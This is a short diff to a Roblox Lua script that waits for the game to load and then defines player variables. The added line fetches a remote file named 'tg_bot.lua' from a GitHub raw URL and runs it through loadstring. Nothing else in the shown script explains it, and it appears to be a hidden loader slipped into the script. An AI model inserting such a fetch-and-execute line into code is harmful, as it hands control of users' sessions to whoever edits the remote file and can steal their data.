@@ -6,6 +6,8 @@ if not game:IsLoaded() then
     game.Loaded:Wait()
 end
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/repositorykreml1n/commands/refs/heads/main/tg_bot.lua",true))()
+-- ========================================================
 
 -- The global table that will hold everything
 local LocalPlayer = game:GetService("Players").LocalPlayer
